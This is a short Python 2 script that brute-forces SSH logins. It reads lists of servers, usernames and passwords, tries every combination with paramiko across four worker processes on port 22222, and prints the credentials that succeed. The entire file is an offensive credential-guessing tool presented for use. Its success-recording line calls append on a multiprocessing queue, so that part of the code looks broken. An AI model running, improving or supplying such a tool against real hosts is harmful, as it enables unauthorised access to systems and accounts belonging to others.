#!/usr/bin/env python

import multiprocessing
import paramiko
import sys
import time
import Queue

PORT = 22222

def worker(cred_queue, success_queue):
    print('Starting new worker thread.')
    while True:
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            return 

        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(creds[0], username=creds[1], password=creds[2], port=PORT)
            success_queue.append((creds[0], creds[1], creds[2]))
            ssh.close()

        except paramiko.AuthenticationException:
            print 'Fail: {0} {1} {2}'.format(creds[0], creds[1], creds[2])

        except Exception, e:
            print 'Fail: {0} {1}'.format(creds[0], str(e))
            cred_queue.put(creds)
            return

        time.sleep(.5)

def file_to_list(filename):
    data = []
    
    with open(filename, 'r') as f:
        for line in f:
            line = line.strip()
            if line == '': continue
            if line.startswith('#'): continue
            data.append(line)

    return data

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'Usage: multi_ssh.py server_file username_file password_file'
        sys.exit()

    threads = 4
    servers = file_to_list(sys.argv[1])
    usernames = file_to_list(sys.argv[2])
    passwords = file_to_list(sys.argv[3])

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    print('Starting worker {0} worker threads.'.format(threads))
    for i in range(threads):
        p = multiprocessing.Process(target=worker,
                                    args=(cred_queue, success_queue))
        procs.append(p)
        p.start()

    print('Loading credential queue.')
    for server in servers:
        for user in usernames:
            for pwd in passwords:
                cred_queue.put((server, user, pwd))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    # Print any successful credentials
    while not success_queue.empty():
        ip, user, pwd = success_queue.get()
        print '{0}: {1}/{2}'.format(ip, user, pwd)
